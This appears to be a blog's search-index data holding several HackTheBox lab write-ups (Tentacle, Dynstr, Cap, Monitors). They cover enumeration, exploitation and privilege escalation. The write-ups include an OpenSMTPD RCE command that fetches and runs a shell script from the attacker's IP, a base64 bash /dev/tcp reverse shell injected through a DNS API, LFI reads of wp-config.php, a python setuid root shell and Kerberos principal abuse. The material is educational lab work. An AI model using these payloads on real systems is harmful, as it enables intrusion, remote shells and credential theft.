&quot;location&quot;:&quot;/storage/emulated/0/DCIM/creds.jpg&quot;, &quot;size&quot;:&quot;1.14 MB (1,200,401 Bytes)&quot;, },{&quot;name&quot;:&quot;224_anc.png&quot;, &quot;time&quot;:&quot;4/21/21 02:37:21 AM&quot;, &quot;location&quot;:&quot;/storage/emulated/0/DCIM/224_anc.png&quot;, &quot;size&quot;:&quot;124.88 KB (127,876 Bytes)&quot;, },]and get the ssh creds.Privescadb RootDevice is running adb server:/sdcard $ ss -lntpState Recv-Q Send-Q Local Address:Port Peer Address:PortLISTEN 0 4 *:5555 *:*It is listening on all networks but somehow it is not working remotely.Using ssh tunnel to forward port and run adb to get root.root flag found in /datax86_64:/ # find / -type f -name root.txt 2&amp;gt;/dev/null/data/root.txt" }, { "title": "Hackthebox - Tentacle", "url": "/posts/tentacle/", "categories": "hackthebox, linux", "tags": "dns, squid proxy, ffuf with multi-proxy, opensmtpd, cve-2020-7247, kerberos, kerberos token, k5login, kadmin", "date": "2021-06-14 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.224 realcorp.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey: | 3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)| 256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)|_ 256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)53/tcp open domain ISC BIND 9.11.20 (RedHat Enterprise Linux 8)| dns-nsid: |_ bind.version: 9.11.20-RedHat-9.11.20-5.el888/tcp open kerberos-sec MIT Kerberos (server time: 2021-06-11 01:59:57Z)3128/tcp open http-proxy Squid http proxy 4.11|_http-server-header: squid/4.11|_http-title: ERROR: The requested URL could not be retrievedService Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8 Found hostname: REALCORP.HTBFootholdDNS EnumerationdigUsing dig command to retrieve “Any information” from dns server.❯ dig ANY @10.10.10.224 realcorp.htb; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; ANY @10.10.10.224 realcorp.htb; (1 server found);; global options: +cmd;; Got answer:;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 50689;; flags: qr aa rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 2;; OPT PSEUDOSECTION:; EDNS: version: 0, flags:; udp: 4096; COOKIE: afc582c6ef7a34cce441fefa60c2e1e152f74c0432c1996b (good);; QUESTION SECTION:;realcorp.htb. IN ANY;; ANSWER SECTION:realcorp.htb. 259200 IN SOA realcorp.htb. root.realcorp.htb. 199609206 28800 7200 2419200 86400realcorp.htb. 259200 IN NS ns.realcorp.htb.;; ADDITIONAL SECTION:ns.realcorp.htb. 259200 IN A 10.197.243.77;; Query time: 620 msec;; SERVER: 10.10.10.224#53(10.10.10.224);; WHEN: Fri Jun 11 15:05:24 IST 2021;; MSG SIZE rcvd: 143 Found internal host IP 10.197.243.77 which is running nameservers.dnsenumBruteforce hosts from dns server.❯ dnsenum --threads 64 --dnsserver 10.10.10.224 -f /usr/share/seclists/Discovery/DNS/namelist.txt realcorp.htb----- realcorp.htb -----... [snip] ...Name Servers:______________ns.realcorp.htb. 259200 IN A 10.197.243.77... [snip] ...Brute forcing with /usr/share/seclists/Discovery/DNS/namelist.txt:___________________________________________________________________ns.realcorp.htb. 259200 IN A 10.197.243.77proxy.realcorp.htb. 259200 IN CNAME ns.realcorp.htb.ns.realcorp.htb. 259200 IN A 10.197.243.77wpad.realcorp.htb. 259200 IN A 10.197.243.31... [snip] ...done. Host on 10.197.243.77 also running proxy server. and there is another host running wpad(?) wpad(Web Proxy Auto-Discovery Protocol) is a method used by clients to locate the URL of a configuration file using DHCP and/or DNS discovery methods. There is another way to reverse dns bruteforce with dnsrecon, on entire subnet.❯ dnsrecon -r 10.197.243.0/24 -n 10.10.10.224 -d realcorp.htb[*] Reverse Look-up of a Range[*] Performing Reverse Lookup from 10.197.243.0 to 10.197.243.255[+] PTR wpad.realcorp.htb 10.197.243.31[+] PTR ns.realcorp.htb 10.197.243.77[+] 2 Records Foundsquid proxyThere is a http-porxy running. which also leaking some information. Subdomain: srv01.realcorp.htb Email: j.nakazawa@realcorp.htb Username: j.nakazawaBecause zone transfer in not available❯ dig axfr realcorp.htb @10.10.10.224; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.16.15-Debian &amp;lt;&amp;lt;&amp;gt;&amp;gt; axfr realcorp.htb @10.10.10.224;; global options: +cmd; Transfer failed.we can use this proxy to access internal proxy.Setup proxychains to send traffic through the squid proxyand /etc/proxychains.conf... [snip] ...[ProxyList]# add proxy here ...#tentaclehttp 10.10.10.224 3128 #Go through the squid proxyhttp 127.0.0.1 3128 #go through localhost to bypass ACLhttp 10.197.243.77 3128 #connect to internal proxy Access control list (ACL) files are text files containing lists that define who can access Proxy Server resources. By default, the Proxy Server uses one ACL file that contains all of the lists for access to your server. In this case proxy server restrict external IP to access internal host but localhost allowed.and now we can access to internal host 10.197.243.31❯ proxychains curl -I http://10.197.243.31/[proxychains] config file found: /etc/proxychains.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.14[proxychains] Strict chain ... 10.10.10.224:3128 ... 127.0.0.1:3128 ... 10.197.243.77:3128 ... 10.197.243.31:80 ... OKHTTP/1.1 200 OKServer: nginx/1.14.1Date: Fri, 11 Jun 2021 04:55:25 GMTContent-Type: text/htmlContent-Length: 4057Last-Modified: Mon, 07 Oct 2019 21:16:24 GMTConnection: keep-aliveETag: &quot;5d9bab28-fd9&quot;Accept-Ranges: bytesport 80 on internal host is running nginx. Run proxychains firefox command to run firefox browser with proxychainshost wpad.realcorp.htb giving 403 on port 80.ffuf with multi-proxywhile ffuf or gobuster don’t support multi-proxy fuzzing i found a hacky solution from github-issue Configure the proxies I want to use in proxychains... [snip] ...http 10.10.10.224 3128http 127.0.0.1 3128http 10.197.243.77 3128 Use proxychains to start a local instance of proxy.py❯ proxychains proxy[proxychains] config file found: /etc/proxychains.conf[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4[proxychains] DLL init: proxychains-ng 4.142021-06-11 18:15:19,817 - pid:13772 [I] load_plugins:334 - Loaded plugin proxy.http.proxy.HttpProxyPlugin2021-06-11 18:15:19,818 - pid:13772 [I] listen:113 - Listening on ::1:88992021-06-11 18:15:19,840 - pid:13772 [I] start_workers:136 - Started 8 workers Use ffuf single proxy feature (-x) to point it to my local proxy.py instance❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt:FUZZ -u http://wpad.realcorp.htb/FUZZ -x &#39;http://::1:8899&#39; -v#... [snip] ...[Status: 301, Size: 185, Words: 6, Lines: 8]| URL | http://wpad.realcorp.htb/.| --&amp;gt; | http://wpad.realcorp.htb/./ * FUZZ: .[Status: 200, Size: 342, Words: 60, Lines: 11]| URL | http://wpad.realcorp.htb/wpad.dat * FUZZ: wpad.dat:: Progress: [11424/11424] :: Job [1/1] :: 67 req/sec :: Duration: [0:02:54] :: Errors: 52 ::and found wpad.dat from wpad.realcorp.htb.wpad(Web Proxy Auto-Discovery Protocol) is a server provides client proxy settings via a particular URL (e.g., http://wpad.example.org/wpad.dat)❯ proxychains -q curl -s http://wpad.realcorp.htb/wpad.datfunction FindProxyForURL(url, host) { if (dnsDomainIs(host, &quot;realcorp.htb&quot;)) return &quot;DIRECT&quot;; if (isInNet(dnsResolve(host), &quot;10.197.243.0&quot;, &quot;255.255.255.0&quot;)) return &quot;DIRECT&quot;; if (isInNet(dnsResolve(host), &quot;10.241.251.0&quot;, &quot;255.255.255.0&quot;)) return &quot;DIRECT&quot;; return &quot;PROXY proxy.realcorp.htb:3128&quot;;}and get another internal subnet 10.241.251.0/24Running dnsrecon for reverse dns bruteforce.❯ proxychains -q dnsrecon -r 10.241.251.0/24 -n 10.10.10.224 -d realcorp.htb[*] Reverse Look-up of a Range[*] Performing Reverse Lookup from 10.241.251.0 to 10.241.251.255[+] PTR srvpod01.realcorp.htb 10.241.251.113[+] 1 Records Found Found another host on 10.241.251.113.Running nmap scan found port 25 smtp❯ proxychains -q nmap --top=10 --open -sC -sV 10.241.251.113Starting Nmap 7.91SVN ( https://nmap.org ) at 2021-06-11 17:21 ISTNmap scan report for 10.241.251.113Host is up (2.1s latency).Not shown: 9 closed portsPORT STATE SERVICE VERSION25/tcp open smtp OpenSMTPD| smtp-commands: smtp.realcorp.htb Hello nmap.scanme.org [10.241.251.1], pleased to meet you, 8BITMIME, ENHANCEDSTATUSCODES, SIZE 36700160, DSN, HELP, |_ 2.0.0 This is OpenSMTPD 2.0.0 To report bugs in the implementation, please contact bugs@openbsd.org 2.0.0 with full details 2.0.0 End of HELP info Service Info: Host: smtp.realcorp.htbOpenSMTPD RCEFound Remote Code Execution from searchsploit❯ searchsploit OpenSMTPD------------------------------------------------------------ --------------------------------- Exploit Title | Path------------------------------------------------------------ ---------------------------------... [snip] ...OpenSMTPD 6.6.1 - Remote Code Execution | linux/remote/47984.py... [snip] ...------------------------------------------------------------ ---------------------------------Shellcodes: No ResultsCVE-2020-7247: smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the “uncommented” default configuration. The issue exists because of an incorrect return value upon failure of input validation. Exploitonly change requires in exploit script is RCPT &amp;lt;email&amp;gt;(a valid user email) which we found from squid leak j.nakazawa@realcorp.htbGetting reverse shell with python web server and wget.proxychains python smtp-rce.py 10.241.251.113 25 &#39;wget -q -O ss.sh 10.10.15.71/shell.sh;bash ss.sh&#39;Privescssh with kerberos tokenget root shell on smtp server host.user which email found from squid is in this box. Found msmtp(an SMTP client) config file in his home folder and config file contains user’s creds.creds not working for ssh but working for kerberos.kerberos is a computer-network authentication protocol that works on the basis of tickets to allow nodes communicating over a non-secure network to prove their identity to one another in a secure manner.that means we can create token from krb5-user tool to login to ssh as user “j.nakazawa”install Package with sudo apt install krb5-userconfigure /etc/krb5.conf[libdefaults] default_realm = REALCORP.HTB[realms] REALCORP.HTB = { kdc = REALCORP.HTB admin_server = REALCORP.HTB default_domain = REALCORP.HTB }[domain_realm] .realcorp.htb = REALCORP.HTBand get the auth token for user “j.nakazawa”but Login with the token is not working and after some research found solutionGSSAPI(Generic Security Services API) allows applications to communicate securely using Kerberos 5 or other security mechanisms.SSH login commandkinit j.nakazawaklistssh -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes -o GSSAPIServerIdentity=srv01.realcorp.htb j.nakazawa@REALCORP.HTBUpdate: GSSAPIAuthentication already enables by default from ssh config file so -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes are not required, the real reason for this to not work because GSSAPI checking for user in REALCORP.HTB’s krb database but user is in srv01.realcorp.htb and if we add srv01.realcorp.htb in hosts file and login with this host, it still won’t work because GSSAPI takes first host name from /etc/hosts file, for this problem we can use GSSAPIServerIdentity to specify host which to look for.k5loginFound crontab running /usr/local/bin/log_backup.sh as user “admin” on srv01 host* * * * * admin /usr/local/bin/log_backup.sh[j.nakazawa@srv01 krb5.conf.d]$ cat /usr/local/bin/log_backup.sh#!/bin/bash/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/cd /home/admin/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log/usr/bin/rm -f access.log cache.logscript is syncing /var/log/squid/ to /home/admin/, that means all file from /var/log/squid/ direcotry copy to /home/admin/ and than creates tar archive from these file.Found a login technique with kerberos with .k5login config file from kerberos docsEXAMPLESSuppose the user “alice” had a .k5login file in her home directory containing just the following line:bob@FOOBAR.ORGThis would allow user “bob” to use Kerberos network applications, such as ssh, to access alice‘s account, using bob‘s Kerberos tickets.and we can use this technique to login to user “admin” with running cronjob.Create .k5login file in the /var/log/squid/ folder.user “j.nakazawa” is in squid group but /var/log/squid directory don’t have read permission.echo &#39;j.nakazawa@REALCORP.HTB&#39; &amp;gt; /var/log/squid/.k5loginand ssh to “admin” with user “j.nakazawa” tokenkadminRuning linpeas from “admin” found some interesting kerberos information.Found kadmin utilitykadmin was found on /usr/bin/kadminFound readable krb5.keytab filekeytab file found, you may be able to impersonate some kerberos principals and add users or modify passwordsKeytab name: FILE:/etc/krb5.keytabKVNO Principal---- -------------------------------------------------------------------------- 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 host/srv01.realcorp.htb@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/changepw@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB 2 kadmin/admin@REALCORP.HTB --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;host/srv01.realcorp.htb@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;host/srv01.realcorp.htb@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;host/srv01.realcorp.htb@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;host/srv01.realcorp.htb@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;host/srv01.realcorp.htb@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/changepw@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/changepw@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/changepw@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/changepw@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/changepw@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/admin@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/admin@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/admin@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/admin@REALCORP.HTB&quot; --- Impersonation command: kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/admin@REALCORP.HTB&quot;we can use keytab admin principal to authenticate into Kerberos V5 administration system console.kadmin -k -t /etc/krb5.keytab -p &quot;kadmin/admin@REALCORP.HTB&quot;# -t keytab file# -k use that keytab file to authenticate# -p specify principalA Kerberos principal is a unique identity to which Kerberos can assign tickets. if we create principal for root user than we can use “ksu” to change user to root.with add_principal command we can add keytab principal, But it This command requires the “add” privilege.Check privileges with get_privs commandkadmin: get_privscurrent privileges: INQUIRE ADD MODIFY DELETEadding principaladd_principal root@REALCORP.HTBthan change user to rootksu root" }, { "title": "Hackthebox - Dynstr", "url": "/posts/dynstr/", "categories": "hackthebox, linux", "tags": "isc bind dnsserver 9.16.1, dyn api, command injection, dns pointer record, ptr, Wildcard in cp", "date": "2021-06-14 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.244 dyna.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 05:7c:5e:b1:83:f9:4f:ae:2f:08:e1:33:ff:f5:83:9e (RSA)| 256 3f:73:b4:95:72:ca:5e:33:f6:8a:8f:46:cf:43:35:b9 (ECDSA)|_ 256 cc:0a:41:b7:a1:9a:43:da:1b:68:f5:2a:f8:2a:75:2c (ED25519)53/tcp open domain ISC BIND 9.16.1 (Ubuntu Linux)| dns-nsid: |_ bind.version: 9.16.1-Ubuntu80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Dyna DNSService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFrom web application Found Email E: dns@dyna.htb on http server Port 80 Domain: dyna.htb Found beta creds in home page dynadns:sndanyd Gobuster Found /nic/updateFootholdISC BIND DNSserver dns server is ISC BIND 9.16.1 ISC BIND: is an open source system free to download and use, offered under the Mozilla Public License. BIND can be used to run a caching DNS server or an authoritative name server, and provides features like load balancing, notify, dynamic update, split DNS, DNSSEC, IPv6, and more. Running Version: 9.16.1 Bind Security Advisories /nic/update returning “badauth”❯ curl http://10.10.10.244/nic/updatebadauthDoing basic auth with creds dynadns:sndanyd on /nic/update with header Authorization: Basic ZHluYWRuczpzbmRhbnlk get diffrent response.❯ curl -s &#39;http://dyna.htb/nic/update&#39;badauth❯ curl -s &#39;http://dynadns:sndanyd@dyna.htb/nic/update&#39;nochg 10.10.15.71This endpoint talking to Bind DNS server using Dynamic DNS Update API specifications.Dynamic DNS (DDNS) is a service that keeps the DNS updated with a web property’s correct IP address, even if that IP address is constantly being updated. Source cloudflare.comThis web application providing Dynamic DNS for a number of domains: dnsalias.htb, dynamicdns.htb, no-ip.htbWith API, We can update DDNS from perform-updatehttp://{username}:{password}@members.dyndns.org/nic/update?hostname={yourhostname}&amp;amp;myip={ipaddress}&amp;amp;wildcard=NOCHG&amp;amp;mx=NOCHG&amp;amp;backmx=NOCHGThat way we can Create/Update Dynamic DNS entry❯ curl &#39;http://dynadns:sndanyd@dyna.htb/nic/update?hostname=test.dnsalias.htb&amp;amp;myip=10.10.15.71&#39;good 10.10.14.41Command Injection in Dyn APIDoing fuzzing with ffuf found special character injection❯ ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt -u &#39;http://dynadns:sndanyd@dyna.htb/nic/update?hostname=FUZZ.dnsalias.htb&amp;amp;myip=0.0.0.0&#39; -ac -v -c# ... [snip] ...[Status: 200, Size: 76, Words: 6, Lines: 5]| URL | http://dynadns:sndanyd@dyna.htb/nic/update?hostname=&quot;.dnsalias.htb&amp;amp;myip=0.0.0.0 * FUZZ: &quot;:: Progress: [32/32] :: Job [1/1] :: 13 req/sec :: Duration: [0:00:05] :: Errors: 0 ::get detailed response❯ curl &#39;http://dynadns:sndanyd@dyna.htb/nic/update?hostname=&quot;.dnsalias.htb&amp;amp;myip=0.0.0.0&#39;server 127.0.0.1zone dnsalias.htbupdate delete .dnsalias.htbgood 0.0.0.0And get command injection❯ curl &#39;http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`id`&quot;.dnsalias.htb&amp;amp;myip=0.0.0.0&#39;server 127.0.0.1zone dnsalias.htbupdate delete uid=33(www-data) gid=33(www-data) groups=33(www-data).dnsalias.htbgood 0.0.0.0Getting reverse shellecho &quot;bash -i &amp;amp;&amp;gt; /dev/tcp/10.10.15.71/4141 0&amp;gt;&amp;amp;1&quot; | base64 #encode reverse shellecho+&quot;YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNS43MS80MTQxIDA%2BJjEK&quot;+|+base64+-d+|+bash #payloadcurl &#39;http://dynadns:sndanyd@dyna.htb/nic/update?hostname=`echo+&quot;YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNS43MS80MTQxIDA%2BJjEK&quot;+|+base64+-d+|+bash`&quot;.dnsalias.htb&amp;amp;myip=0.0.0.0&#39;PrivescDNS pointer record(PTR)User “bindmgr” have .ssh directory which contains ssh key, but can’t read private key.(remote) www-data@dynstr.dyna.htb:/home/bindmgr/.ssh$ ls -ltotal 16-rw-r--r-- 1 bindmgr bindmgr 419 Mar 13 12:00 authorized_keys-rw------- 1 bindmgr bindmgr 1823 Mar 13 11:48 id_rsa-rw-r--r-- 1 bindmgr bindmgr 395 Mar 13 11:48 id_rsa.pub-rw-r--r-- 1 bindmgr bindmgr 444 Mar 13 12:09 known_hostsUser’s home directory contains some debug log in /home/bindmgr/support-case-C62796521(remote) www-data@dynstr.dyna.htb:/home/bindmgr$ ls -ltotal 8drwxr-xr-x 2 bindmgr bindmgr 4096 Mar 13 14:53 support-case-C62796521that folder contains some debug output in which, found private ssh key of user “bindmgr”(remote) www-data@dynstr.dyna.htb:/home/bindmgr/support-case-C62796521$ ls -l total 428-rw-r--r-- 1 bindmgr bindmgr 237141 Mar 13 14:53 C62796521-debugging.script-rw-r--r-- 1 bindmgr bindmgr 29312 Mar 13 14:53 C62796521-debugging.timing-rw-r--r-- 1 bindmgr bindmgr 1175 Mar 13 14:53 command-output-C62796521.txt-rw-r--r-- 1 bindmgr bindmgr 163048 Mar 13 14:52 strace-C62796521.txtbut ssh key is not working.looking into /home/bindmgr/.ssh/authorized_keys which contains from=&quot;*.infra.dyna.htb&quot;. That means AnyHost.infra.dyna.htb can login to user “bindmgr” with his private key.A DNS pointer record (PTR for short) provides the domain name associated with an IP address. A DNS PTR record is exactly the opposite of the ‘A’ record, which provides the IP address associated with a domain name. DNS PTR records are used in reverse DNS lookups.we can add PTR record into infra dynamic dns associated to our tun0 ip, which resolve AnyHost.infra.dyna.htb with our ip address and allow us to ssh with “bindmgr” ssh key.nsupdate allow to ad PTR record.The -k may also be used to specify a SIG(0) key used to authenticate Dynamic DNS update requests. In this case, the key specified is not an HMAC-MD5 key. and we need to update PTR record in “infra” Dynamic DNS, That means we need “infra” Dynamic DNS private key, which found in /etc/bind/infra.key.Solution for adding PTR record with nsupdate.nsupdate -k /etc/bind/infra.keyupdate add gotcha.infra.dyna.htb. 86400 A 10.10.15.71&amp;lt;Enter&amp;gt;update add 71.15.10.10.in-addr.arpa. 300 PTR gotcha.infra.dyna.htb.sendWildcard in cp Commanduser “bindmgr” can run /usr/local/bin/bindmgr.sh as any user with NOPASSWD as sudo.bindmgr@dynstr:~$ sudo -lsudo: unable to resolve host dynstr.dyna.htb: Name or service not knownMatching Defaults entries for bindmgr on dynstr: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser bindmgr may run the following commands on dynstr: (ALL) NOPASSWD: /usr/local/bin/bindmgr.sh/usr/local/bin/bindmgr.sh script breakdownThis code checks .version file in current directory and its content#!/bin/bashBINDMGR_CONF=/etc/bind/named.conf.bindmgrBINDMGR_DIR=/etc/bind/named.bindmgrindent() { sed &#39;s/^/ /&#39;; }echo &quot;[+] Running $0 to stage new configuration from $PWD.&quot;if [[ ! -f .version ]] ; then echo &quot;[-] ERROR: Check versioning. Exiting.&quot; exit 42fiif [[ &quot;`cat .version 2&amp;gt;/dev/null`&quot; -le &quot;`cat $BINDMGR_DIR/.version 2&amp;gt;/dev/null`&quot; ]] ; then echo &quot;[-] ERROR: Check versioning. Exiting.&quot; exit 43fiThan adding all file names from current directory in named.conf.bindmgr config file.# Create config file that includes all files from named.bindmgr.echo &quot;[+] Creating $BINDMGR_CONF file.&quot;printf &#39;// Automatically generated file. Do not modify manually.\\n&#39; &amp;gt; $BINDMGR_CONFfor file in * ; do printf &#39;include &quot;/etc/bind/named.bindmgr/%s&quot;;\\n&#39; &quot;$file&quot; &amp;gt;&amp;gt; $BINDMGR_CONFdonecopy .version and all other files with a wildcard from current directory to /etc/bind/named.bindmgr/# Stage new version of configuration files.echo &quot;[+] Staging files to $BINDMGR_DIR.&quot;cp .version * /etc/bind/named.bindmgr/and after that, checking config file with named-checkconf utility, which is not so important because our exploit present in this wildcard.cp command have a flag from man page -p same as --preserve=mode,ownership,timestamps --preserve[=ATTR_LIST] preserve the specified attributes (default: mode,ownership,timestamps), if possible additional attributes: context, links, xattr, allthis flag allow to preserve(as the name suggest) same permission which file currently have for any user who copy that file.and same as tar wildcard exploit we create a file named --preserve=mode. When script run cp command this that file as a command flag as copy all file from current directory with same permissions which files currently have for any user who run the script into /etc/bind/named.bindmgr/." }, { "title": "Hackthebox - Cap", "url": "/posts/cap/", "categories": "hackthebox, linux", "tags": "parameter manipulation, pcap analysis, python setuid capability", "date": "2021-06-05 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.245 cap.htbnmap scan:PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http gunicorn... [snip] ...|_http-server-header: gunicorn|_http-title: Security DashboardService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Port 80 Running gunicorn server. gunicorn: The Gunicorn “Green Unicorn” is a Python Web Server Gateway Interface HTTP server. It is a pre-fork worker model, ported from Ruby’s Unicorn project. FootholdParameter ManipulationGoing through the wep app found “Parameter Manipulation” in /data/ which allows to access resources that should not be accessible.changing value to 0 give access stored pcap file on the serverdownload the pcap file❯ wget http://cap.htb/download/0--2021-06-06 18:56:34-- http://cap.htb/download/0Resolving cap.htb (cap.htb)... 10.129.119.229Connecting to cap.htb (cap.htb)|10.129.119.229|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 9935 (9.7K) [application/vnd.tcpdump.pcap]Saving to: ‘0’0 100%[=======&amp;gt;] 9.70K --.-KB/s in 0.002s 2021-06-06 18:56:35 (4.39 MB/s) - ‘0’ saved [9935/9935]PCAP file analysisopen it in wireshark and view tcp.stream eq 3 which contains ftp traffic packet.and get ftp creds: nathan:Buck3tH4TF0RM3!ftp have read access to file system but nothing interesting here.but same creds work for ssh login because user “nathan” is in the box.Privescpython with setuid capabilityFound cap_setuid capability in python3capabilities man page: Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normally reserved for processes whose effective user ID is 0CAP_SETUID Allow changing of the UID (set UID of root in you process). That means setuid() sets the effective user ID of the calling process.and python have setuid() capability, that means python command allow user to set effective userID for its calling process.gtfobins also have exploit for python capabilitiesexploit: python -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;nathan@cap:~$ python3.8 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)&#39;# iduid=0(root) gid=1001(nathan) groups=1001(nathan)" }, { "title": "Hackthebox - Monitors", "url": "/posts/monitors/", "categories": "hackthebox, linux", "tags": "wp-plugin, spritz, lfi, cacti 1.2.12, sqli, rce, cve-2020-14295, socat portforwarding, apache ofbiz 17.12.01, cve-2021-30128, Container Capability, sys-module", "date": "2021-05-30 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.238 monitors.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)| 256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)|_ 256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))|_http-generator: WordPress 5.5.1|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Welcome to Monitor &amp;amp;#8211; Taking hardware monitoring seriouslyService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelPort 80 is running wordpress WordPress version 5.5.1 identified User(s) Identified: admin don’t know the reason but Monitor.htb gives 403 Forbidden andMonitors.htb give 200.wpscan:❯ wpscan -e ap --url http://monitors.htb... [snip] ...[i] Plugin(s) Identified:[+] wp-with-spritz | Location: http://monitors.htb/wp-content/plugins/wp-with-spritz/ | Latest Version: 1.0 (up to date) | Last Updated: 2015-08-20T20:15:00.000Z | | Found By: Urls In Homepage (Passive Detection) | | [!] 1 vulnerability identified: | | [!] Title: WP with Spritz 1.0 - Unauthenticated File Inclusion | References: | - https://wpscan.com/vulnerability/cdd8b32a-b424-4548-a801-bbacbaad23f8 | - https://www.exploit-db.com/exploits/44544/ | | Version: 4.2.4 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http://monitors.htb/wp-content/plugins/wp-with-spritz/readme.txtFootholdwp-plugin Spritz LFI wpscan: The WP with Spritz WordPress plugin was affected by an Unauthenticated File Inclusion security vulnerability. ExploitDB - https://www.exploit-db.com/exploits/44544 Proof of Concept http://www.example.com/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd ❯ curl -s &#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/hostname&#39;monitorsGet username and password from wp-config.php❯ curl -s &#39;http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/var/www/wordpress/wp-config.php&#39; | grep define | head -n3define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );define( &#39;DB_USER&#39;, &#39;wpadmin&#39; );define( 